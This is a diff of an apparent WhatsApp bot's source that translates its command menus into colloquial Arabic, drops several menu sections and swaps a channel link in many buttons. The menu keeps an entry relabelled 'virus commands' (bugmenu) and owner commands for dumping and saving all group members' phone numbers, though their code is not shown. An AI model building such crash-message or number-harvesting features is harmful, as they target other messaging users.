                   hasMediaAttachment: false  
                 }),
           nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
@@ -16929,87 +16925,55 @@ break
 `{"title":"قائمه😆💗",
 "sections":[{"title":"${botname}",
 "rows":[{"header":"جميع الاوامر😎👄",
-"title":"ابعت يصديقي",
+"title":"ابعت الاوامر كلها 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"اوامر"},
 {"header":"اوامر البحث😎👄",
-"title":"ابعت يصديقي",
+"title":"اوامر قايمه البحث 😍",
 "description":"خوفو ص المزعجين😆💗️",
 "id":"${prefix}searchmenu"},
 {"header":"اوامر التحميلات😎👄️",
-"title":"ابعت يصديقي",
+"title":"اوامر قايمه تحميلات 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"${prefix}downloadmenu"},
 {"header":"اوامر الألعاب😎👄",
-"title":"ابعت يصديقي",
+"title":"اوامر قايمه الالعاب 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"${prefix}gamemenu"},
 {"header":"اوامر ترفيه😎👄️",
-"title":"ابعت يصديقي",
+"title":"اوامر قايمه ترفيه 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"${prefix}funmenu"},
 {"header":"اوامر الذكاء الاصطناعي😎👄",
-"title":"ابعت يصديقي",
+"title":"اوامر قايمه الذكاء الاصطناعي 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"${prefix}aimenu"},
 {"header":"اوامر الجروبات😎👄",
-"title":"ابعت يصديقي",
+"title":"اوامر قايمه الجروبات 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"${prefix}groupmenu"},
 {"header":"اوامر المطور😎👄",
-"title":"ابعت يصديقي",
+"title":"اوامر قايمه المطور 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"${prefix}ownermenu"},
-{"header":"🎲CONVERT MENU🎴",
-"title":"ابعت يصديقي",
-"description":"خوفو ص المزعجين😆💗",
-"id":"${prefix}convertmenu"},
-{"header":"🧣LIST MENU🪢",
-"title":"ابعت يصديقي",
+{"header":"اوامر ليستات 😎👄",
+"title":"اوامر قايمه اليستات 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"${prefix}listmenu"},
-{"header":"📚RELIGION MENU📚",
-"title":"ابعت يصديقي",
-"description":"خوفو ص المزعجين😆💗",
-"id":"${prefix}religionmenu"},
-{"header":"🤩NSFW MENU🥵",
-"title":"ابعت يصديقي",
-"description":"خوفو ص المزعجين😆💗",
-"id":"${prefix}nsfwmenu"},
-{"header":"🚾ANIME MENU☪️",
-"title":"ابعت يصديقي",
-"description":"خوفو ص المزعجين😆💗️",
-"id":"${prefix}animemenu"},
-{"header":"💣RANDOM PHOTO MENU🔮",
-"title":"ابعت يصديقي",
-"description":"خوفو ص المزعجين😆💗",
-"id":"${prefix}randomphotomenu"},
-{"header":"👑RANDOM VIDEO MENU🧬",
-"title":"ابعت يصديقي",
-"description":"خوفو ص المزعجين😆💗",
-"id":"${prefix}randomvideomenu"},
-{"header":"🧧STICKER MENU🏆",
-"title":"ابعت يصديقي",
+{"header":"اوامر استيكرات 😎👄",
+"title":"اوامر قايمه استيكرات 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"${prefix}stickermenu"},
-{"header":"🦋DATABASE MENU🍭",
-"title":"ابعت يصديقي",
+{"header":"اوامر قاعده البيانات 😎👄",
+"title":"اوامر قايمه قاعده البيانات 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"${prefix}databasemenu"},
-{"header":"🧬STORE MENU🍁",
-"title":"ابعت يصديقي",
-"description":"خوفو ص المزعجين😆💗",
-"id":"${prefix}storemenu"},
-{"header":"🌟STALKER MENU💝",
-"title":"ابعت يصديقي",
-"description":"خوفو ص المزعجين😆💗",
-"id":"${prefix}stalkermenu"},
-{"header":"🐛BUG MENU🍇",
-"title":"ابعت يصديقي",
+{"header":"اوامر فيروسات 😎👄",
+"title":"اوامر قايمه فيروسات 😍",
 "description":"خوفو ص المزعجين😆💗",
 "id":"${prefix}bugmenu"},
-{"header":"🎗️OTHER MENU🎡",
-"title":"ابعت يصديقي",
+{"header":"اوامر تانيه 😎👄",
+"title":"اوامر قايمه تانيه 😍",
 "description":"خوفو ص المزعجين😆💗️",
 "id":"${prefix}othermenu"}]
 }]
@@ -17024,7 +16988,7 @@ break
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
                   newsletterJid: global.xchannel.jid,
-                  newsletterName: ownername,
+                  newsletterName: namegroupp,
                   serverMessageId: 143
                 }
                 }
@@ -17041,19 +17005,19 @@ await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 break
 case 'اوامر': {
 let xmenu_oh = `
-╭──❍「 *GREETING* 」❍
-├${setv} *Hi 👋*
+╭──❍「 *يمرحب* 」❍
+├${setv} *اهلا 👋*
 ├${setv} *${m.pushName}* 
 ├${setv} *${xeonytimewisher} 🥰* 
 ╰─┬────❍ ${readmore}
 ╭─┴❍「 *GUIDE* 」❍
-├${setv} *🅞 = For Owner* 
-├${setv} *🅕 = For Free User*
-├${setv} *🅟 = For Premium User*
+├${setv} *🅞 = صاحب البوت* 
+├${setv} *🅕 = الاعضاء*
+├${setv} *🅟 = الاعضاء المميزين*
 ╰─┬────❍
-╭─┴❍「 *OWNER MENU* 」❍
-│${setv} ${prefix}addbadword 🅞
-│${setv} ${prefix}delbadword 🅞
+╭─┴❍「 *اوامر المطور* 」❍
+│${setv} ${prefix}اضافه-شتيمه 🅞
+│${setv} ${prefix}ازاله-شتيمه 🅞
 │${setv} ${prefix}autoread 🅞
 │${setv} ${prefix}autobio 🅞
 │${setv} ${prefix}autotype 🅞
@@ -17089,10 +17053,10 @@ let xmenu_oh = `
 │${setv} ${prefix}getautoblocknumber 🅞
 │${setv} ${prefix}getantiforeignnumber 🅞
 │${setv} ${prefix}userjid 🅞
-│${setv} ${prefix}setbotbio 🅞
+│${setv} ${prefix}غير-بايو-بتاعك 🅞
 │${setv} ${prefix}delppbot 🅞
 │${setv} ${prefix}shutdown 🅞
-│${setv} ${prefix}setppbot 🅞
+│${setv} ${prefix}غير-صورتك 🅞
 │${setv} ${prefix}addprem 🅞
 │${setv} ${prefix}delprem 🅞
 │${setv} ${prefix}addowner 🅞
@@ -17132,59 +17096,36 @@ let xmenu_oh = `
 │${setv} < 🅞
 ╰─┬────❍
 ╭─┴❍「 *GROUP MENU* 」❍
-│${setv} ${prefix}antibot 🅖
-│${setv} ${prefix}antiviewonce 🅖
-│${setv} ${prefix}readviewonce 🅖
-│${setv} ${prefix}welcome 🅖
-│${setv} ${prefix}adminevent 🅖
-│${setv} ${prefix}groupevent 🅖
-│${setv} ${prefix}antiforeign 🅖
-│${setv} ${prefix}antimedia 🅖
-│${setv} ${prefix}antiaudio 🅖
-│${setv} ${prefix}antivideo 🅖
-│${setv} ${prefix}antiimage 🅖
-│${setv} ${prefix}antidocument 🅖
-│${setv} ${prefix}antilocation 🅖
-│${setv} ${prefix}anticontact 🅖
-│${setv} ${prefix}antisticker 🅖
-│${setv} ${prefix}antipoll 🅖
-│${setv} ${prefix}antilink 🅖
-│${setv} ${prefix}antipromotion 🅖
-│${setv} ${prefix}antivirtex 🅖
-│${setv} ${prefix}grouplink 🅖
-│${setv} ${prefix}listadmin 🅖
-│${setv} ${prefix}invite 🅖
-│${setv} ${prefix}ephemeral 🅖
-│${setv} ${prefix}delete 🅖
-│${setv} ${prefix}setppgroup 🅖
-│${setv} ${prefix}delppgroup 🅖
-│${setv} ${prefix}setnamegc 🅖
-│${setv} ${prefix}setdesc 🅖
-│${setv} ${prefix}add 🅖
-│${setv} ${prefix}kick 🅖
-│${setv} ${prefix}promote 🅖
-│${setv} ${prefix}demote 🅖
-│${setv} ${prefix}kickall 🅖
-│${setv} ${prefix}promoteall 🅖
-│${setv} ${prefix}demoteall 🅖
-│${setv} ${prefix}getcontact 🅞
-│${setv} ${prefix}savecontact 🅞
-│${setv} ${prefix}sendcontact 🅞
+│${setv} ${prefix}وريني-صوره 🅖
+│${setv} ${prefix}ترحيب 🅖
+│${setv} ${prefix}منع-لينكات 🅖
+│${setv} ${prefix}لينك-الجروب 🅖
+│${setv} ${prefix}مين-الادمن 🅖
+│${setv} ${prefix}ابعتلو-دعوه 🅖
+│${setv} ${prefix}امسح 🅖
+│${setv} ${prefix}صوره-الجروب 🅖
+│${setv} ${prefix}امسح-صوره-جروب 🅖
+│${setv} ${prefix}اسم-الجروب 🅖
+│${setv} ${prefix}بايو-الجروب 🅖
+│${setv} ${prefix}ضيف 🅖
+│${setv} ${prefix}طرد 🅖
+│${setv} ${prefix}مشرف 🅖
+│${setv} ${prefix}نزلو 🅖
+│${setv} ${prefix}طلعهم 🅖
+│${setv} ${prefix}ارفعهم 🅖
+│${setv} ${prefix}نزلهم 🅖
+│${setv} ${prefix}ابعت-كل-الارقام 🅞
+│${setv} ${prefix}احفظ-الارقام 🅞
+│${setv} ${prefix}ابعت-رقم 🅞
 │${setv} ${prefix}contactag 🅞
-│${setv} ${prefix}hidetag 🅖
-│${setv} ${prefix}totag 🅖
-│${setv} ${prefix}tagall 🅖
-│${setv} ${prefix}editinfo 🅖
+│${setv} ${prefix}منشن-خفي 🅖
+│${setv} ${prefix}اعمها-منشن 🅖
+│${setv} ${prefix}منشن 🅖
+│${setv} ${prefix}اعدادات-الجروب 🅖
 │${setv} ${prefix}opentime 🅖
 │${setv} ${prefix}closetime 🅖
 │${setv} ${prefix}resetlink 🅖
 │${setv} ${prefix}getbio 🅖
-│${setv} ${prefix}vote 🅖
-│${setv} ${prefix}upvote 🅖
-│${setv} ${prefix}downvote 🅖
-│${setv} ${prefix}checkvote 🅖
-│${setv} ${prefix}delvote 🅖
-│${setv} ${prefix}antivirus 🅖
 │${setv} ${prefix}antibadword 🅖
 │${setv} ${prefix}nsfw 🅖
 │${setv} ${prefix}react 🅖
@@ -17851,7 +17792,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -17901,7 +17842,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -18049,7 +17990,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -18086,7 +18027,7 @@ let xmenu_oh = `
 ├${setv} *🅕 = For Free User*
 ├${setv} *🅟 = For Premium User*
 ╰─┬────❍
-╭─┴❍「 *OWNER MENU* 」❍
+╭─┴❍「 *اوامر المطور* 」❍
 │${setv} ${prefix}addbadword 🅞
 │${setv} ${prefix}delbadword 🅞
 │${setv} ${prefix}autoread 🅞
@@ -18334,7 +18275,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -18384,7 +18325,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -18536,7 +18477,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -18801,7 +18742,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -18851,7 +18792,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -19003,7 +18944,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	     }
            ],
           }),
@@ -19222,7 +19163,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -19272,7 +19213,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -19424,7 +19365,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -19657,7 +19598,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -19707,7 +19648,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -19859,7 +19800,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -20109,7 +20050,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -20159,7 +20100,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               },              
               {
   "name": "quick_reply",
@@ -20315,7 +20256,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -20534,7 +20475,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -20584,7 +20525,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -20736,7 +20677,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -21000,7 +20941,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -21050,7 +20991,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -21202,7 +21143,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -21417,7 +21358,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -21467,7 +21408,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -21619,7 +21560,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -21830,7 +21771,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -21880,7 +21821,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -22032,7 +21973,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -22258,7 +22199,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -22308,7 +22249,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -22460,7 +22401,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
 	      }
            ],
           }),
@@ -22681,7 +22622,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
            ],
           })
@@ -22731,7 +22672,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
+                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 💌\",\"url\":\"https://whatsapp.com/channel/0029Va7AtL9GpLHPLpNVfu1f\",\"merchant_url\":\"https://www.google.com\"}"
               }
                                   ],
                 }),
@@ -22883,7 +22824,7 @@ let msg = generateWAMessageFromContent(m.chat, {
               },
               {
                  "name": "cta_url",
-                 "buttonParamsJson": "{\"display_text\":\"WhatsApp 📱\",\"url\":\"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07\",\"merchant_url\":\"https://www.google.com\"}"
